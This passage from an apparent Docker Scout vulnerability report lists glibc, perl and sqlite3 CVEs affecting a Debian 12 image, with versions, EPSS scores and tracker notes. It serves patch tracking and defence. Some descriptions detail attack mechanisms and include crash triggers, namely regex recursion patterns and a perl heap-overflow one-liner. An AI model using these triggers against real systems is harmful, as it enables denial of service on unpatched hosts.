Backported and introduced in glibc-2.34 branch: https://sourceware.org/git/?p=glibc.git;a=commit;h=32e5db37684ffcbc6ae34fcc6cdcf28670506baa

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-4437?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u14"><img alt="low : CVE--2026--4437" src="https://img.shields.io/badge/CVE--2026--4437-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u14</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u14</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.089%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Calling gethostbyaddr or gethostbyaddr_r with a configured nsswitch.conf that specifies the library's DNS backend in the GNU C Library version 2.34 to version 2.43 could, with a crafted response from the configured DNS server, result in a violation of the DNS specification that causes the application to treat a non-answer section of the DNS response as a valid answer.

---
- glibc 2.42-14 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1131435)
[trixie] - glibc 2.41-12+deb13u3
[bookworm] - glibc 2.36-9+deb12u14
[bullseye] - glibc <not-affected> (introduced in v2.34)
https://sourceware.org/bugzilla/show_bug.cgi?id=34014
Proposed patch: https://inbox.sourceware.org/libc-alpha/20260320194250.1089143-1-carlos@<!-- -->redhat.com/
https://www.openwall.com/lists/oss-security/2026/03/23/2
Introduced with: https://sourceware.org/git/?p=glibc.git;a=commit;h=e32547d661a43da63368e488b6cfa9c53b4dcf92 (glibc-2.37)
Backported and introduced in glibc-2.36 branch: https://sourceware.org/git/?p=glibc.git;a=commit;h=77f523c473878ec0051582ef15161c6982879095
Backported and introduced in glibc-2.34 branch: https://sourceware.org/git/?p=glibc.git;a=commit;h=32e5db37684ffcbc6ae34fcc6cdcf28670506baa

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-9192?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2019--9192" src="https://img.shields.io/badge/CVE--2019--9192-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.309%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>85th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(|)(\\1\\1)*' in grep, a different issue than CVE-2018-20796. NOTE: the software maintainer disputes that this is a vulnerability because the behavior occurs only with a crafted pattern

---
- glibc <unfixed> (unimportant)
- eglibc <removed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=24269

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010025?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2019--1010025" src="https://img.shields.io/badge/CVE--2019--1010025-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.215%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>79th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may guess the heap addresses of pthread_created thread. The component is: glibc. NOTE: the vendor's position is "ASLR bypass itself is not a vulnerability.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22853

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010024?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2019--1010024" src="https://img.shields.io/badge/CVE--2019--1010024-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.509%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass ASLR using cache of thread stack and heap. The component is: glibc. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22852

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010023?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2019--1010023" src="https://img.shields.io/badge/CVE--2019--1010023-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.293%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>53rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Re-mapping current loaded library with malicious ELF file. The impact is: In worst case attacker may evaluate privileges. The component is: libld. The attack vector is: Attacker sends 2 ELF files to victim and asks to run ldd on it. ldd execute code. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22851

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010022?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2019--1010022" src="https://img.shields.io/badge/CVE--2019--1010022-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.150%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>36th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass stack guard protection. The component is: nptl. The attack vector is: Exploit stack buffer overflow vulnerability and use this bypass vulnerability to bypass stack guard. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22850

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-20796?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2018--20796" src="https://img.shields.io/badge/CVE--2018--20796-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.305%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>80th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(\227|)(\\1\\1|t1|\\\2537)+' in grep.

---
- glibc <unfixed> (unimportant)
- eglibc <removed> (unimportant)
https://debbugs.gnu.org/cgi/bugreport.cgi?bug=34141
https://lists.gnu.org/archive/html/bug-gnulib/2019-01/msg00108.html
No treated as vulnerability: https://sourceware.org/glibc/wiki/Security%20Exceptions

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2010-4756?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2010--4756" src="https://img.shields.io/badge/CVE--2010--4756-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.313%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>55th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The glob implementation in the GNU C Library (aka glibc or libc6) allows remote authenticated users to cause a denial of service (CPU and memory consumption) via crafted glob expressions that do not match any pathnames, as demonstrated by glob expressions in STAT commands to an FTP daemon, a different vulnerability than CVE-2010-2632.

---
- glibc <removed> (unimportant)
- eglibc <unfixed> (unimportant)
That's standard POSIX behaviour implemented by (e)glibc. Applications using
glob need to impose limits for themselves

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 3" src="https://img.shields.io/badge/M-3-fbb552"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>perl</strong> <code>5.36.0-7+deb12u1</code> (deb)</summary>

<small><code>pkg:deb/debian/perl@5.36.0-7%2Bdeb12u1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-31484?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C5.36.0-7%2Bdeb12u3"><img alt="high : CVE--2023--31484" src="https://img.shields.io/badge/CVE--2023--31484-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><5.36.0-7+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>5.36.0-7+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.523%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>82nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

CPAN.pm before 2.35 does not verify TLS certificates when downloading distributions over HTTPS.

---
[experimental] - perl 5.38.0~rc2-1
- perl 5.38.2-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1035109)
[bookworm] - perl 5.36.0-7+deb12u3
[buster] - perl <no-dsa> (Minor issue)
https://github.com/andk/cpanpm/pull/175
https://github.com/andk/cpanpm/commit/9c98370287f4e709924aee7c58ef21c85289a7f0 (2.35-TRIAL)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-48959?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="high : CVE--2026--48959" src="https://img.shields.io/badge/CVE--2026--48959-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.050%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>16th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

IO::Uncompress::Unzip versions before 2.220 for Perl allow CPU exhaustion via per-byte read loop in fastForward.  fastForward() compares length $offset (the digit count of the offset, 1 to 19) against the chunk size $c instead of $offset itself, so $c shrinks from 16 KiB to 1-19 bytes per iteration.  Extracting a named entry from an attacker supplied zip via IO::Uncompress::Unzip->new($zip, Name => $target) drives a per-byte read loop scaling with the entry's compressed size, up to the non-Zip64 4 GiB cap.

---
- libio-compress-perl 2.220-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1138051)
- perl 5.40.1-8 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1138856)
https://lists.security.metacpan.org/cve-announce/msg/40434381/
Fixed by: https://github.com/pmqs/IO-Compress/commit/68db44076f4c1a86a2ffe53a958eac6cabaf72e2 (v2.220)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-48962?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="high : CVE--2026--48962" src="https://img.shields.io/badge/CVE--2026--48962-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.081%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

IO::Compress versions before 2.220 for Perl can execute arbitrary code in File::GlobMapper via an attacker-controlled output glob.  _parseOutputGlob() wraps the caller-supplied output glob string in double quotes and stores it in the parser state; _getFiles() then runs the stored expression through eval STRING. A literal double quote in the output glob closes the dquote wrapper, and the characters that follow are evaluated as Perl.  Arbitrary Perl in the output glob executes at the calling process's privilege.

---
- libio-compress-perl 2.220-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1138055)
- perl 5.40.1-8 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1138854)
https://lists.security.metacpan.org/cve-announce/msg/40434385/
Fixed by: https://github.com/pmqs/IO-Compress/commit/f2db247bf90d4cc7ee2710be384946081f3b4610 (v2.220)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-7010?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="medium : CVE--2026--7010" src="https://img.shields.io/badge/CVE--2026--7010-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.041%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

HTTP::Tiny versions before 0.093 for Perl do not validate CRLF in HTTP request lines or control field header values.  The unvalidated inputs are the method and URI in the request line, the URL host that becomes the `Host:` header, and HTTP/1.1 control data field values.  An attacker who controls one of these inputs, for example a user supplied URL passed to a webhook or URL fetch endpoint, can inject additional headers and smuggle requests to the upstream server.

---
- libhttp-tiny-perl 0.092-2
[trixie] - libhttp-tiny-perl <no-dsa> (Minor issue)
[bookworm] - libhttp-tiny-perl <no-dsa> (Minor issue)
- perl 5.40.1-8 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1138858)
https://lists.security.metacpan.org/cve-announce/msg/39952806/
Fixed by: https://github.com/Perl-Toolchain-Gang/HTTP-Tiny/commit/d73c7651e82ace02693842df55928b6c3ae7c38d (release-0.093)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-40909?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C5.36.0-7%2Bdeb12u3"><img alt="medium : CVE--2025--40909" src="https://img.shields.io/badge/CVE--2025--40909-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><5.36.0-7+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>5.36.0-7+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.031%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Perl threads have a working directory race condition where file operations may target unintended paths.  If a directory handle is open at thread creation, the process-wide current working directory is temporarily changed in order to clone that handle for the new thread, which is visible from any third (or more) thread already running.   This may lead to unintended operations such as loading code or accessing files from unexpected locations, which a local attacker may be able to exploit.  The bug was introduced in commit 11a11ecf4bea72b17d250cfb43c897be1341861e and released in Perl version 5.13.6

---
[experimental] - perl 5.40.1-4
- perl 5.40.1-5 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098226)
[bookworm] - perl 5.36.0-7+deb12u3
https://github.com/Perl/perl5/issues/23010
Fixed by: https://github.com/Perl/perl5/commit/fc8063aa51f400394f2e44173fd4f87f080502c9 (v5.41.13)
Fixed by: https://github.com/Perl/perl5/commit/a1327b5df78d0bc1e56b6cff663aa8b508d4e2d6 (v5.41.13)
Fixed by: https://github.com/Perl/perl5/commit/1f9097b342e0e37d619dfab6ea82ea99611b30bf (v5.41.13)
Fixed by: https://github.com/Perl/perl5/commit/5c2e7577a3fa70dc39d27c0426db6eb897eee9b1 (v5.41.13)
Squashed version of fix (to help backports):
https://github.com/Perl/perl5/commit/918bfff86ca8d6d4e4ec5b30994451e0bd74aba9
https://lists.security.metacpan.org/cve-announce/msg/30017499/

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-15649?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="medium : CVE--2025--15649" src="https://img.shields.io/badge/CVE--2025--15649-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.013%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

IO::Uncompress::Unzip versions before 2.215 for Perl propagate uncaught exception when parsing zip header with malformed DOS date.  _dosToUnixTime() decodes the local-file-header last-modification date field and calls Time::Local::timelocal() without an eval guard. A header whose date field decodes to an out-of-range month, day, or hour causes timelocal() to die.  The exception propagates out of IO::Uncompress::Unzip->new($file) where callers expect undef plus $UnzipError.

---
- libio-compress-perl 2.217-1
- perl 5.40.1-8 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1138863)
https://lists.security.metacpan.org/cve-announce/msg/40434380/
https://github.com/pmqs/IO-Compress/issues/65
Fixed by: https://github.com/pmqs/IO-Compress/commit/fd28c1d2374eee9811f6d0c5bddc0957abdf1da8 (v2.215)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-48961?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--48961" src="https://img.shields.io/badge/CVE--2026--48961-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.048%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>16th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

IO::Compress versions from 2.207 before 2.220 for Perl ship a zipdetails CLI tool that crashes with undefined subroutine on Info-ZIP Unix Extra Field with 8-byte UID or GID.  When decode_ux() in bin/zipdetails handles an Info-ZIP Unix Extra Field (tag 0x7875) with UID Size or GID Size set to 8, causing zipdetails to decode an 8-byte UID or GID value, it dispatches through decodeLitteEndian(), which calls a misnamed helper unpackValueQ. The actual function defined in the same file is unpackValue_Q (with underscore); the call raises 'Undefined subroutine &main::unpackValueQ' and the script exits with status 255.  Library callers of IO::Compress and IO::Uncompress are not affected; the defect is in the bundled CLI tool.

---
- libio-compress-perl 2.220-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1138052)
[trixie] - libio-compress-perl <no-dsa> (Minor issue)
[bookworm] - libio-compress-perl <not-affected> (Vulnerable code introduced later)
[bullseye] - libio-compress-perl <not-affected> (Vulnerable code introduced later)
- perl 5.40.1-8 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1138855)
https://lists.security.metacpan.org/cve-announce/msg/40434383/
Introduced with: https://github.com/pmqs/IO-Compress/commit/ddfe67584a228877e5d28840da75ff32e435a5e3 (v2.207)
Fixed by: https://github.com/pmqs/IO-Compress/commit/33c89d03d6e746ed2ead4f2f6570d47864c61bc7 (v2.220)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-56406?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C5.36.0-7%2Bdeb12u2"><img alt="low : CVE--2024--56406" src="https://img.shields.io/badge/CVE--2024--56406-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><5.36.0-7+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>5.36.0-7+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.072%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap buffer overflow vulnerability was discovered in Perl.   Release branches 5.34, 5.36, 5.38 and 5.40 are affected, including development versions from 5.33.1 through 5.41.10.  When there are non-ASCII bytes in the left-hand-side of the `tr` operator, `S_do_trans_invmap` can overflow the destination pointer `d`.     $ perl -e '$_ = "\x{FF}" x 1000000; tr/\xFF/\x{100}/;'     Segmentation fault (core dumped)  It is believed that this vulnerability can enable Denial of Service and possibly Code Execution attacks on platforms that lack sufficient defenses.

---
- perl 5.40.1-3
[bullseye] - perl <not-affected> (Vulnerable code introduced later)
https://lists.security.metacpan.org/cve-announce/msg/28708725/
Introduced by: https://github.com/Perl/perl5/commit/a311ee08b6781f83a7785f578a26bbc21a7ae457 (v5.33.1)
Fixed by: https://github.com/Perl/perl5/commit/87f42aa0e0096e9a346c9672aa3a0bd3bef8c1dd

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31486?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2023--31486" src="https://img.shields.io/badge/CVE--2023--31486-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.767%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>74th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

HTTP::Tiny before 0.083, a Perl core module since 5.13.9 and available standalone on CPAN, has an insecure default TLS configuration where users must opt in to verify certificates.

---
- libhttp-tiny-perl 0.088-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=962407; unimportant)
[experimental] - perl 5.38.0~rc2-1
- perl 5.38.2-2 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=954089)
https://www.openwall.com/lists/oss-security/2023/04/18/14
https://github.com/chansen/p5-http-tiny/issues/134
https://blog.hackeriet.no/perl-http-tiny-insecure-tls-default-affects-cpan-modules/
https://hackeriet.github.io/cpan-http-tiny-overview/
Applications need to explicitly opt in to enable verification.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2011-4116?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2011--4116" src="https://img.shields.io/badge/CVE--2011--4116-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.186%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

_is_safe in the File::Temp module for Perl does not properly handle symlinks.

---
- perl <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=776268)
http://thread.gmane.org/gmane.comp.security.oss.general/6174/focus=6177
https://github.com/Perl-Toolchain-Gang/File-Temp/issues/14

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 3" src="https://img.shields.io/badge/L-3-fce1a9"/> <!-- unspecified: 0 --><strong>sqlite3</strong> <code>3.40.1-2</code> (deb)</summary>

<small><code>pkg:deb/debian/sqlite3@3.40.1-2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-11824?s=debian&n=sqlite3&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="high : CVE--2026--11824" src="https://img.shields.io/badge/CVE--2026--11824-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

SQLite before 3.53.2 contains a heap-based buffer overflow vulnerability in the FTS5 full-text search extension that allows attackers to cause a crash or execute arbitrary code by supplying a crafted database with malicious continuation page metadata specifying a szLeaf value smaller than 4. Attackers can trigger an integer underflow in fts5ChunkIterate() causing an inflated remaining byte count during FTS5 MATCH query processing, leading to a heap buffer overflow of attacker-controlled data in applications compiled with SQLITE_ENABLE_FTS5.

---
- sqlite3 <unfixed>
[trixie] - sqlite3 <no-dsa> (Minor issue)
https://sqlite.org/src/info/061febcf41ca
https://sqlite.org/src/info/4a5ad516ea93

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-11822?s=debian&n=sqlite3&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="high : CVE--2026--11822" src="https://img.shields.io/badge/CVE--2026--11822-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

SQLite before 3.53.2 contains memory corruption vulnerabilities in the FTS5 full-text search extension that allow attackers to cause process crashes, memory exhaustion, or arbitrary code execution by supplying a crafted database with malformed FTS5 page data. Attackers can trigger an out-of-bounds read in fts5LeafSeek() via an attacker-controlled loop bound and a heap buffer overflow write in fts5ChunkIterate() through a crafted continuation page causing an integer underflow, exploitable when an FTS5 MATCH query is executed against the malicious database.

---
- sqlite3 <unfixed>
[trixie] - sqlite3 <no-dsa> (Minor issue)
https://sqlite.org/src/info/061febcf41ca
https://sqlite.org/src/info/4a5ad516ea93

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-6965?s=debian&n=sqlite3&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.40.1-2%2Bdeb12u2"><img alt="high : CVE--2025--6965" src="https://img.shields.io/badge/CVE--2025--6965-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.40.1-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.40.1-2+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.629%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>82nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

There exists a vulnerability in SQLite versions before 3.50.2 where the number of aggregate terms could exceed the number of columns available. This could lead to a memory corruption issue. We recommend upgrading to version 3.50.2 or above.

---
- sqlite3 3.46.1-7 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1109379)
[bookworm] - sqlite3 3.40.1-2+deb12u2
[bullseye] - sqlite3 <postponed> (Minor issue)
https://github.com/google/security-research/security/advisories/GHSA-qj7j-3jp8-8ccv
https://www.sqlite.org/src/info/5508b56fd24016c13981ec280ecdd833007c9d8dd595edb295b984c2b487b5c8

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-7104?s=debian&n=sqlite3&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.40.1-2%2Bdeb12u1"><img alt="medium : CVE--2023--7104" src="https://img.shields.io/badge/CVE--2023--7104-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.40.1-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.40.1-2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.129%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in SQLite SQLite3 up to 3.43.0 and classified as critical. This issue affects the function sessionReadRecord of the file ext/session/sqlite3session.c of the component make alltest Handler. The manipulation leads to heap-based buffer overflow. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-248999.

---
- sqlite3 3.43.1-1
[bookworm] - sqlite3 3.40.1-2+deb12u1
[buster] - sqlite3 <no-dsa> (Minor issue)
https://sqlite.org/forum/forumpost/5bcbf4571c
Fixed by: https://sqlite.org/src/info/0e4e7a05c4204b47

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-70873?s=debian&n=sqlite3&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2025--70873" src="https://img.shields.io/badge/CVE--2025--70873-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.052%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An information disclosure issue in the zipfileInflate function in the zipfile extension in SQLite v3.51.1 and earlier allows attackers to obtain heap memory via supplying a crafted ZIP file.

---
- sqlite3 <unfixed> (unimportant)
https://sqlite.org/src/info/3d459f1fb1bd1b5e
https://sqlite.org/forum/forumpost/761eac3c82
